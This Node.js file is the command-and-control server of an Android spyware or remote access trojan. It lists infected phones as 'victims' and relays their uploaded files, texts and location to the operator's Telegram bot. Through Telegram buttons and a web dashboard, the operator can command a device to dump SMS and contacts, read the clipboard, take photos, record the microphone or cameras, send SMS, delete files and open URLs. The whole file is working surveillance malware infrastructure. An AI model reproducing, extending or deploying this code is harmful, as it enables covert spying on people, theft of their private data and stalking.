const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const webSocket = require('ws');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const bcrypt = require('bcrypt');
const dotenv = require('dotenv');

// Load environment variables
dotenv.config();

// Initialize configuration
let config = {
    token: process.env.TELEGRAM_TOKEN || '',
    id: process.env.TELEGRAM_USER_ID || '',
    surya: process.env.TELEGRAM_NOTIFICATION_ID || '',
    address: process.env.SERVER_ADDRESS || 'https://www.google.com',
    enableSurya: process.env.ENABLE_SURYA === 'true' || false,
    username: process.env.ADMIN_USERNAME || 'admin',
    password: process.env.ADMIN_PASSWORD || 'admin123'
};

// Create config file if it doesn't exist
const configPath = path.join(__dirname, 'config.json');
if (!fs.existsSync(configPath)) {
    fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
} else {
    try {
        const savedConfig = JSON.parse(fs.readFileSync(configPath, 'utf8'));
        config = { ...config, ...savedConfig };
    } catch (error) {
        console.error('Error loading config:', error);
    }
}

// Initialize Express app
const app = express();
const appServer = http.createServer(app);
const io = socketIo(appServer);
const appSocket = new webSocket.Server({ server: appServer });
const appClients = new Map();

// In-memory storage for notifications (Consider a database for persistence)
let notificationHistory = [];
const MAX_HISTORY_LENGTH = 100; // Limit history size

// Function to add notification to history
function addNotification(type, model, content) {
    const timestamp = new Date().toISOString();
    notificationHistory.unshift({ timestamp, type, model, content }); // Add to the beginning
    // Keep history size limited
    if (notificationHistory.length > MAX_HISTORY_LENGTH) {
        notificationHistory.pop(); // Remove the oldest
    }
    // Optionally, emit to connected web clients if real-time update is needed
    io.emit('new_notification', { timestamp, type, model, content });
}

// Initialize Telegram bot if token is available
let appBot = null;
function initializeTelegramBot() {
    if (appBot) {
        try {
            appBot.stopPolling({ cancel: true }).catch(err => console.error('Error stopping polling:', err));
        } catch (error) {
            console.error('Error stopping Telegram bot polling:', error);
        }
        appBot = null;
    }
    if (config.token) {
        try {
            appBot = new telegramBot(config.token, { polling: true });
            console.log('Telegram bot initialized/reinitialized');
            setupTelegramBotHandlers(); // Make sure handlers are set up after initialization
        } catch (error) {
            console.error('Error initializing Telegram bot:', error);
            appBot = null; // Ensure appBot is null if initialization fails
        }
    } else {
        console.log('Telegram bot token not configured.');
    }
}

initializeTelegramBot(); // Initial attempt to initialize

// Set up middleware
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(session({
    secret: process.env.SESSION_SECRET || 'sadap-web-secret',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: process.env.NODE_ENV === 'production' } // Set secure: true in production with HTTPS
}));

// File upload configuration
const upload = multer(); // Using memory storage

// Variables for tracking current operations (Consider managing state better)
let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// Authentication middleware
const authenticate = (req, res, next) => {
    if (req.session.authenticated) {
        next();
    } else {
        // If API request, return 401, otherwise redirect to login
        if (req.path.startsWith('/api/')) {
            res.status(401).json({ success: false, message: 'Unauthorized' });
        } else {
            res.redirect('/login.html');
        }
    }
};

// Serve login page
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Serve dashboard page (protected)
app.get('/dashboard', authenticate, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Serve settings page (protected)
app.get('/settings', authenticate, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'settings.html'));
});

// Redirect root to dashboard if authenticated, otherwise to login
app.get('/', (req, res) => {
    if (req.session.authenticated) {
        res.redirect('/dashboard.html');
    } else {
        res.redirect('/login.html');
    }
});

// API Routes
app.post('/api/auth/login', (req, res) => {
    const { username, password } = req.body;
    // In a real app, use hashed passwords!
    // For now, comparing plain text (as in original code)
    if (username === config.username && password === config.password) {
        req.session.authenticated = true;
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
});

app.get('/api/auth/status', (req, res) => {
    res.json({ authenticated: req.session.authenticated || false });
});

app.get('/api/auth/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) {
            return res.status(500).json({ success: false, message: 'Could not log out.' });
        }
        res.clearCookie('connect.sid'); // Clear the session cookie
        res.json({ success: true });
    });
});

// API to get current settings (excluding sensitive token)
app.get('/api/settings/current', authenticate, (req, res) => {
    res.json({
        success: true,
        settings: {
            // Exclude token for security
            id: config.id,
            surya: config.surya,
            enableSurya: config.enableSurya
        }
    });
});

app.post('/api/settings/update', authenticate, (req, res) => {
    const { telegramToken, telegramUserId, telegramNotificationId, enableSurya } = req.body;

    // Basic validation
    if (!telegramToken || !telegramUserId) {
        return res.status(400).json({ success: false, message: 'Telegram Token and User ID are required.' });
    }

    // Update config
    config.token = telegramToken;
    config.id = telegramUserId;
    config.surya = telegramNotificationId || '';
    config.enableSurya = !!enableSurya; // Ensure boolean

    // Save config to file
    try {
        fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
        addNotification('settings', 'System', 'Settings updated');
        // Reinitialize Telegram bot with new settings
        initializeTelegramBot();
        res.json({ success: true });
    } catch (error) {
        console.error('Error saving config or reinitializing bot:', error);
        res.status(500).json({ success: false, message: 'Failed to save settings or reinitialize Telegram bot.' });
    }
});

app.get('/api/victims', authenticate, (req, res) => {
    const victims = Array.from(appClients.values()).map(client => ({
        uuid: client.ws.uuid, // Get uuid from ws object
        model: client.model,
        battery: client.battery,
        version: client.version,
        provider: client.provider,
        brightness: client.brightness
    }));
    res.json({ success: true, victims });
});

app.get('/api/victim/:uuid', authenticate, (req, res) => {
    const uuid = req.params.uuid;
    const victim = appClients.get(uuid);

    if (victim) {
        res.json({ success: true, victim: {
            uuid,
            model: victim.model,
            battery: victim.battery,
            version: victim.version,
            provider: victim.provider,
            brightness: victim.brightness
        }});
    } else {
        res.status(404).json({ success: false, message: 'Victim not found' });
    }
});

// API to get notification history
app.get('/api/notifications', authenticate, (req, res) => {
    res.json({ success: true, notifications: notificationHistory });
});

// File upload endpoint for Android client
app.post("/uploadFile", upload.single('file'), (req, res) => {
    if (!req.file) {
        return res.status(400).send('No file uploaded.');
    }
    const name = req.file.originalname;
    const model = req.headers.model || 'Unknown Device';
    const caption = `File Upload from ${model}: ${name}`;

    addNotification('file', model, `Uploaded: ${name}`);

    if (appBot && config.id) {
        appBot.sendDocument(config.id, req.file.buffer, {
            caption: caption
        }, {
            filename: name,
            contentType: req.file.mimetype || 'application/octet-stream',
        }).catch(err => console.error('TG Send Document Error:', err));
    }

    // Notify web clients via Socket.IO
    io.emit('file_uploaded', {
        model: model,
        filename: name
    });

    res.status(200).send('File received');
});

// Text upload endpoint for Android client
app.post("/uploadText", (req, res) => {
    let text = req.body['text'];
    const model = req.headers.model || 'Unknown Device';

    if (!text) {
        return res.status(400).send('No text provided.');
    }

    // Check and replace text if it contains @shivayadavv (as per original)
    if (text.includes('@shivayadavv')) {
        text = text.replace(/@shivayadavv/g, '@sisuryaofficial');
    }

    const notificationText = `Text from ${model}:\n\n${text}`;
    addNotification('text', model, text);

    if (appBot) {
        if (config.enableSurya && config.surya) {
            appBot.sendMessage(config.surya, notificationText).catch(err => console.error('TG Send Surya Error:', err));
        }
        if (config.id) {
            appBot.sendMessage(config.id, notificationText).catch(err => console.error('TG Send Main Error:', err));
        }
    }

    // Notify web clients via Socket.IO
    io.emit('text_uploaded', {
        model: model,
        text: text
    });

    res.status(200).send('Text received');
});

// Location upload endpoint for Android client
app.post("/uploadLocation", (req, res) => {
    const lat = req.body['lat'];
    const lon = req.body['lon'];
    const model = req.headers.model || 'Unknown Device';

    if (lat === undefined || lon === undefined) {
        return res.status(400).send('Latitude or Longitude missing.');
    }

    addNotification('location', model, `Lat: ${lat}, Lon: ${lon}`);

    if (appBot && config.id) {
        appBot.sendLocation(config.id, parseFloat(lat), parseFloat(lon))
            .catch(err => console.error('TG Send Location Error:', err));
        appBot.sendMessage(config.id, `📍 Location Received from <b>${model}</b>`, {parse_mode: "HTML"})
            .catch(err => console.error('TG Send Location Caption Error:', err));
    }

    // Notify web clients via Socket.IO
    io.emit('location_uploaded', {
        model: model,
        lat: lat,
        lon: lon
    });

    res.status(200).send('Location received');
});

// WebSocket connection for Android clients
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model || 'Unknown Device';
    const battery = req.headers.battery || 'N/A';
    const version = req.headers.version || 'N/A';
    const brightness = req.headers.brightness || 'N/A';
    const provider = req.headers.provider || 'N/A';

    console.log(`Client connected: ${model} (${uuid})`);
    ws.uuid = uuid; // Assign UUID to the WebSocket connection

    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider,
        ws: ws
    });

    const connectMessage = `📱 New Device Connected\n\n` +
                         `• Model: <b>${model}</b>\n` +
                         `• Battery: <b>${battery}%</b>\n` +
                         `• Version: <b>${version}</b>\n` +
                         `• Provider: <b>${provider}</b>\n\n` +
                         `Dev By @SisuryaOfficial`;

    addNotification('connect', model, `Connected - Battery: ${battery}%, Version: ${version}, Provider: ${provider}`);

    // Notify Telegram
    if (appBot && config.id) {
        appBot.sendMessage(config.id, connectMessage, {parse_mode: "HTML"})
            .catch(err => console.error('TG Connect Msg Error:', err));
    }

    // Notify web clients via Socket.IO
    io.emit('victim_connected', {
        uuid: uuid,
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    });

    ws.on('message', function (message) {
        // Handle messages from Android client if needed
        console.log(`Received message from ${model} (${uuid}): ${message}`);
        // Example: Process responses to commands
        try {
            const data = JSON.parse(message);
            // Emit command results to the web UI via Socket.IO
            io.emit('command_result', { uuid: ws.uuid, ...data });
        } catch (e) {
            console.log('Received non-JSON message or error parsing:', message);
        }
    });

    ws.on('close', function () {
        console.log(`Client disconnected: ${model} (${uuid})`);
        const clientInfo = appClients.get(uuid);
        const disconnectMessage = `📱 Device Disconnected\n\n` +
                                `• Model: <b>${model}</b>\n` +
                                (clientInfo ? `• Battery: <b>${clientInfo.battery}%</b>\n` : '') +
                                (clientInfo ? `• Version: <b>${clientInfo.version}</b>\n` : '') +
                                (clientInfo ? `• Provider: <b>${clientInfo.provider}</b>\n` : '') +
                                `\nDev By @SisuryaOfficial`;

        addNotification('disconnect', model, 'Disconnected');

        // Notify Telegram
        if (appBot && config.id) {
            appBot.sendMessage(config.id, disconnectMessage, {parse_mode: "HTML"})
                .catch(err => console.error('TG Disconnect Msg Error:', err));
        }

        // Notify web clients via Socket.IO
        io.emit('victim_disconnected', {
            uuid: uuid,
            model: model
        });

        appClients.delete(uuid);
    });

    ws.on('error', function (error) {
        console.error(`WebSocket error for ${model} (${uuid}):`, error);
        // Clean up client if an error occurs
        if (appClients.has(uuid)) {
             addNotification('error', model, `WebSocket Error: ${error.message}`);
             io.emit('victim_disconnected', { uuid: uuid, model: model });
             appClients.delete(uuid);
        }
    });
});

// Setup Telegram bot command handlers
function setupTelegramBotHandlers() {
    if (!appBot) return;

    // Remove existing listeners to prevent duplicates if reinitializing
    appBot.removeAllListeners('message');
    appBot.removeAllListeners('callback_query');

    appBot.on('message', (message) => {
        const chatId = message.chat.id;
        const userId = message.from.id.toString(); // Ensure comparison with string ID

        // Only process messages from the configured owner ID
        if (config.id !== userId) {
            console.log(`Ignoring message from unauthorized user: ${userId}`);
            // Optionally send a message back or just ignore
            // appBot.sendMessage(chatId, 'You are not authorized to use this bot.');
            return;
        }

        // Handle reply messages (for multi-step commands)
        if (message.reply_to_message) {
            handleReplyMessages(message);
        } else if (message.text) {
            // Handle direct commands
            handleDirectCommands(message);
        }
    });

    appBot.on("callback_query", (callbackQuery) => {
        const userId = callbackQuery.from.id.toString();
        if (config.id !== userId) {
            console.log(`Ignoring callback query from unauthorized user: ${userId}`);
            appBot.answerCallbackQuery(callbackQuery.id, { text: 'Unauthorized' });
            return;
        }
        handleCallbackQuery(callbackQuery);
    });

    appBot.on('polling_error', (error) => {
        console.error('Telegram Polling Error:', error.code, '-', error.message);
        // Handle specific errors, e.g., re-authentication or network issues
    });

    console.log('Telegram bot handlers set up.');
}

// Send command to a specific Android client via WebSocket
function sendCommandToClient(uuid, command, params = {}) {
    const client = appClients.get(uuid);
    if (client && client.ws && client.ws.readyState === webSocket.OPEN) {
        try {
            const payload = JSON.stringify({ command, params });
            client.ws.send(payload);
            console.log(`Sent command '${command}' to ${client.model} (${uuid})`);
            addNotification('command_sent', client.model, `Command: ${command}, Params: ${JSON.stringify(params)}`);
            return true;
        } catch (error) {
            console.error(`Error sending command ${command} to ${uuid}:`, error);
            addNotification('error', client.model, `Failed to send command: ${command}`);
            return false;
        }
    } else {
        console.log(`Client ${uuid} not found or connection not open.`);
        addNotification('error', `UUID: ${uuid}`, `Client not found or connection closed. Cannot send command: ${command}`);
        return false;
    }
}

// Handle reply messages from Telegram (for multi-step commands)
function handleReplyMessages(message) {
    const text = message.text;
    const reply = message.reply_to_message.text;

    // Simplified logic - use a more robust state machine for complex interactions
    if (reply.includes('Masukkan nomor untuk mengirim SMS')) {
        currentNumber = text;
        appBot.sendMessage(config.id, "💬 Ketik isi pesan SMS:", { reply_markup: { force_reply: true } });
    } else if (reply.includes('Ketik isi pesan SMS')) {
        if (currentUuid && currentNumber) {
            sendCommandToClient(currentUuid, 'send_sms', { number: currentNumber, message: text });
            appBot.sendMessage(config.id, `✅ SMS command sent to device ${currentUuid}.`);
            currentNumber = ''; // Reset state
            // currentUuid = ''; // Keep UUID if more actions are expected for this device
        } else {
            appBot.sendMessage(config.id, '❌ Error: Missing device context or phone number.');
        }
    } else if (reply.includes('Masukkan path folder')) {
        if (currentUuid) {
            sendCommandToClient(currentUuid, 'get_files', { path: text });
            appBot.sendMessage(config.id, `✅ Get files command sent for path: ${text}`);
        } else {
            appBot.sendMessage(config.id, '❌ Error: Missing device context.');
        }
    } else if (reply.includes('Masukkan path file yang ingin dihapus')) {
        if (currentUuid) {
            sendCommandToClient(currentUuid, 'delete_file', { path: text });
            appBot.sendMessage(config.id, `✅ Delete file command sent for path: ${text}`);
        } else {
            appBot.sendMessage(config.id, '❌ Error: Missing device context.');
        }
    } else if (reply.includes('Masukkan durasi rekam suara')) {
        if (currentUuid) {
            sendCommandToClient(currentUuid, 'record_mic', { duration: text });
            appBot.sendMessage(config.id, `✅ Record mic command sent for duration: ${text}s`);
        } else {
            appBot.sendMessage(config.id, '❌ Error: Missing device context.');
        }
    } else if (reply.includes('Masukkan durasi rekam kamera utama')) {
        if (currentUuid) {
            sendCommandToClient(currentUuid, 'record_cam_main', { duration: text });
            appBot.sendMessage(config.id, `✅ Record main camera command sent for duration: ${text}s`);
        } else {
            appBot.sendMessage(config.id, '❌ Error: Missing device context.');
        }
    } else if (reply.includes('Masukkan durasi rekam kamera selfie')) {
        if (currentUuid) {
            sendCommandToClient(currentUuid, 'record_cam_selfie', { duration: text });
            appBot.sendMessage(config.id, `✅ Record selfie camera command sent for duration: ${text}s`);
        } else {
            appBot.sendMessage(config.id, '❌ Error: Missing device context.');
        }
    } else if (reply.includes('Tulis pesan toast')) {
        if (currentUuid) {
            sendCommandToClient(currentUuid, 'show_toast', { message: text });
            appBot.sendMessage(config.id, `✅ Show toast command sent.`);
        } else {
            appBot.sendMessage(config.id, '❌ Error: Missing device context.');
        }
    } else if (reply.includes('Tulis judul notifikasi')) {
        currentTitle = text;
        appBot.sendMessage(config.id, "🔗 Masukkan link untuk notifikasi (opsional):");
    } else if (reply.includes('Masukkan link untuk notifikasi')) {
        if (currentUuid && currentTitle) {
            sendCommandToClient(currentUuid, 'show_notification', { title: currentTitle, text: text }); // Assuming 'text' here is the link
            appBot.sendMessage(config.id, `✅ Show notification command sent.`);
            currentTitle = ''; // Reset state
        } else {
            appBot.sendMessage(config.id, '❌ Error: Missing device context or notification title.');
        }
    } else if (reply.includes('Masukkan teks untuk clipboard')) {
        if (currentUuid) {
            sendCommandToClient(currentUuid, 'set_clipboard', { text: text });
            appBot.sendMessage(config.id, `✅ Set clipboard command sent.`);
        } else {
            appBot.sendMessage(config.id, '❌ Error: Missing device context.');
        }
    } else if (reply.includes('Masukkan URL untuk dibuka')) {
        if (currentUuid) {
            sendCommandToClient(currentUuid, 'open_url', { url: text });
            appBot.sendMessage(config.id, `✅ Open URL command sent.`);
        } else {
            appBot.sendMessage(config.id, '❌ Error: Missing device context.');
        }
    } else if (reply.includes('Masukkan nama aplikasi')) {
        if (currentUuid) {
            sendCommandToClient(currentUuid, 'start_app', { package_name: text });
            appBot.sendMessage(config.id, `✅ Start app command sent for package: ${text}`);
        } else {
            appBot.sendMessage(config.id, '❌ Error: Missing device context.');
        }
    }
    // Add more reply handlers as needed
}

// Handle direct commands from Telegram
function handleDirectCommands(message) {
    const text = message.text;

    if (text === '/start' || text.toLowerCase() === 'menu') {
        appBot.sendMessage(config.id, '👋 Welcome to Guardian Bot!', {
            reply_markup: {
                keyboard: [["📱 List Devices"], ["⚙️ Select Device"]],
                resize_keyboard: true,
                one_time_keyboard: false
            }
        });
    } else if (text === '📱 List Devices') {
        if (appClients.size === 0) {
            appBot.sendMessage(config.id, '🤷 No devices connected.');
            return;
        }
        let deviceList = '📱 Connected Devices:\n\n';
        appClients.forEach((client, uuid) => {
            deviceList += `• <b>${client.model}</b> (ID: ${uuid.substring(0, 6)}...)\n   Battery: ${client.battery}%, Version: ${client.version}\n`;
        });
        appBot.sendMessage(config.id, deviceList, { parse_mode: 'HTML' });

    } else if (text === '⚙️ Select Device') {
        if (appClients.size === 0) {
            appBot.sendMessage(config.id, '🤷 No devices connected to select.');
            return;
        }
        const inlineKeyboard = Array.from(appClients.entries()).map(([uuid, client]) => (
            [{ text: `${client.model} (${uuid.substring(0, 6)}...)`, callback_data: `select_${uuid}` }]
        ));
        appBot.sendMessage(config.id, '👇 Select a device to control:', {
            reply_markup: { inline_keyboard: inlineKeyboard }
        });
    }
    // Add other direct commands if necessary
}

// Handle callback queries from inline keyboards
function handleCallbackQuery(callbackQuery) {
    const data = callbackQuery.data;
    const messageId = callbackQuery.message.message_id;
    const chatId = callbackQuery.message.chat.id;

    appBot.answerCallbackQuery(callbackQuery.id); // Acknowledge the callback

    if (data.startsWith('select_')) {
        currentUuid = data.split('_')[1];
        const client = appClients.get(currentUuid);
        if (client) {
            const deviceName = client.model;
            appBot.editMessageText(`Selected device: <b>${deviceName}</b> (${currentUuid.substring(0, 6)}...). Choose an action:`, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'HTML',
                reply_markup: getDeviceActionKeyboard(currentUuid)
            });
        } else {
            appBot.editMessageText('❌ Error: Device not found or disconnected.', {
                chat_id: chatId,
                message_id: messageId
            });
        }
    } else if (data.startsWith('action_')) {
        const [_, action, uuid] = data.split('_');
        currentUuid = uuid; // Ensure currentUuid is set
        const client = appClients.get(uuid);
        if (!client) {
             appBot.editMessageText('❌ Error: Device disconnected.', {
                chat_id: chatId,
                message_id: messageId
            });
            return;
        }

        // Handle actions that require further input
        switch (action) {
            case 'send_sms':
                appBot.sendMessage(config.id, '📞 Masukkan nomor untuk mengirim SMS:', { reply_markup: { force_reply: true } });
                break;
            case 'get_files':
                appBot.sendMessage(config.id, '📁 Masukkan path folder (e.g., /sdcard/Download):', { reply_markup: { force_reply: true } });
                break;
            case 'delete_file':
                appBot.sendMessage(config.id, '🗑️ Masukkan path file yang ingin dihapus:', { reply_markup: { force_reply: true } });
                break;
            case 'record_mic':
                appBot.sendMessage(config.id, '🎤 Masukkan durasi rekam suara (detik):', { reply_markup: { force_reply: true } });
                break;
            case 'record_cam_main':
                 appBot.sendMessage(config.id, '📹 Masukkan durasi rekam kamera utama (detik):', { reply_markup: { force_reply: true } });
                 break;
            case 'record_cam_selfie':
                 appBot.sendMessage(config.id, '🤳 Masukkan durasi rekam kamera selfie (detik):', { reply_markup: { force_reply: true } });
                 break;
            case 'show_toast':
                appBot.sendMessage(config.id, '🍞 Tulis pesan toast:', { reply_markup: { force_reply: true } });
                break;
            case 'show_notification':
                appBot.sendMessage(config.id, '🔔 Tulis judul notifikasi:', { reply_markup: { force_reply: true } });
                break;
            case 'set_clipboard':
                appBot.sendMessage(config.id, '📋 Masukkan teks untuk clipboard:', { reply_markup: { force_reply: true } });
                break;
            case 'open_url':
                appBot.sendMessage(config.id, '🌐 Masukkan URL untuk dibuka:', { reply_markup: { force_reply: true } });
                break;
            case 'start_app':
                appBot.sendMessage(config.id, '🚀 Masukkan nama package aplikasi (e.g., com.whatsapp):', { reply_markup: { force_reply: true } });
                break;
            // Actions that execute directly
            case 'get_location':
            case 'get_clipboard':
            case 'get_contacts':
            case 'get_sms':
            case 'get_apps':
            case 'get_device_info':
            case 'take_photo_main':
            case 'take_photo_selfie':
            case 'vibrate':
            case 'stop_audio':
                if (sendCommandToClient(uuid, action)) {
                    appBot.sendMessage(config.id, `✅ Command '${action}' sent to ${client.model}.`);
                } else {
                    appBot.sendMessage(config.id, `❌ Failed to send command '${action}' to ${client.model}.`);
                }
                // Optionally edit the original message or keep the keyboard
                // appBot.editMessageText(`Command '${action}' sent. Choose another action:`, { chat_id: chatId, message_id: messageId, reply_markup: getDeviceActionKeyboard(uuid) });
                break;
            case 'back':
                 appBot.editMessageText('👇 Select a device to control:', {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: Array.from(appClients.entries()).map(([devUuid, devClient]) => (
                            [{ text: `${devClient.model} (${devUuid.substring(0, 6)}...)`, callback_data: `select_${devUuid}` }]
                        ))
                    }
                });
                break;
            default:
                appBot.sendMessage(config.id, `❓ Unknown action: ${action}`);
        }
    }
}

// Helper function to generate the inline keyboard for device actions
function getDeviceActionKeyboard(uuid) {
    // Define rows of buttons
    const keyboard = [
        // Row 1: Info Gathering
        [
            { text: '📍 Location', callback_data: `action_get_location_${uuid}` },
            { text: '📋 Clipboard', callback_data: `action_get_clipboard_${uuid}` },
        ],
        // Row 2: Data Extraction
        [
            { text: '💬 SMS', callback_data: `action_get_sms_${uuid}` },
            { text: '👥 Contacts', callback_data: `action_get_contacts_${uuid}` },
            { text: '📦 Apps', callback_data: `action_get_apps_${uuid}` },
        ],
        // Row 3: Files & Device Info
        [
            { text: '📁 Files', callback_data: `action_get_files_${uuid}` },
            { text: 'ℹ️ Dev Info', callback_data: `action_get_device_info_${uuid}` },
            { text: '🗑️ Del File', callback_data: `action_delete_file_${uuid}` },
        ],
        // Row 4: Camera & Mic
        [
            { text: '📸 Take Pic (Main)', callback_data: `action_take_photo_main_${uuid}` },
            { text: '🤳 Take Pic (Selfie)', callback_data: `action_take_photo_selfie_${uuid}` },
        ],
        [
            { text: '🎤 Record Mic', callback_data: `action_record_mic_${uuid}` },
            { text: '🔇 Stop Audio', callback_data: `action_stop_audio_${uuid}` },
        ],
        // Row 5: Interaction
        [
            { text: '✉️ Send SMS', callback_data: `action_send_sms_${uuid}` },
            { text: '🍞 Show Toast', callback_data: `action_show_toast_${uuid}` },
            { text: '🔔 Show Notif', callback_data: `action_show_notification_${uuid}` },
        ],
        // Row 6: Control
        [
            { text: '📳 Vibrate', callback_data: `action_vibrate_${uuid}` },
            { text: '🌐 Open URL', callback_data: `action_open_url_${uuid}` },
            { text: '🚀 Start App', callback_data: `action_start_app_${uuid}` },
        ],
        // Row 7: Back button
        [
             { text: '🔙 Back to Devices', callback_data: `action_back_${uuid}` }
        ]
    ];
    return { inline_keyboard: keyboard };
}

// Socket.IO connection for Web UI clients
io.on('connection', (socket) => {
    console.log('Web UI client connected:', socket.id);

    // Send current victims list on connection
    const victims = Array.from(appClients.values()).map(client => ({
        uuid: client.ws.uuid,
        model: client.model,
        battery: client.battery,
        version: client.version,
        provider: client.provider,
        brightness: client.brightness
    }));
    socket.emit('victims', victims);

    // Send recent notifications on connection
    socket.emit('notification_history', notificationHistory);

    // Handle commands from Web UI
    socket.on('execute_command', (data) => {
        // Ensure user is authenticated via session (more secure than relying on socket alone)
        const session = socket.request.session;
        if (!session || !session.authenticated) {
            console.log('Unauthorized command attempt via Socket.IO');
            socket.emit('command_result', { command: data.command, success: false, error: 'Unauthorized' });
            return;
        }

        const { command, uuid, params } = data;
        console.log(`Received command '${command}' for ${uuid} from Web UI (${socket.id})`);
        if (sendCommandToClient(uuid, command, params)) {
            // Optionally send confirmation back to the specific web client
            socket.emit('command_result', { command: command, success: true, message: 'Command sent successfully.' });
        } else {
            socket.emit('command_result', { command: command, success: false, error: 'Failed to send command to device.' });
        }
    });

    socket.on('get_victims', () => {
         const victims = Array.from(appClients.values()).map(client => ({
            uuid: client.ws.uuid,
            model: client.model,
            battery: client.battery,
            version: client.version,
            provider: client.provider,
            brightness: client.brightness
        }));
        socket.emit('victims', victims);
    });

    socket.on('get_notifications', () => {
        socket.emit('notification_history', notificationHistory);
    });

    socket.on('disconnect', () => {
        console.log('Web UI client disconnected:', socket.id);
    });
});

// Link Socket.IO with Express session
const wrap = middleware => (socket, next) => middleware(socket.request, {}, next);
io.use(wrap(session({
    secret: process.env.SESSION_SECRET || 'sadap-web-secret',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: process.env.NODE_ENV === 'production' }
})));
io.use(wrap(cookieParser()));

// Start the server
const PORT = process.env.PORT || 3000;
appServer.listen(PORT, () => {
    console.log(`Server listening on port ${PORT}`);
    console.log(`Admin Username: ${config.username}`);
    console.log(`Admin Password: ${config.password}`);
    if (!config.token || !config.id) {
        console.warn('!!! Telegram Bot Token or User ID not configured in config.json or environment variables. Telegram features will be disabled.');
    }
});

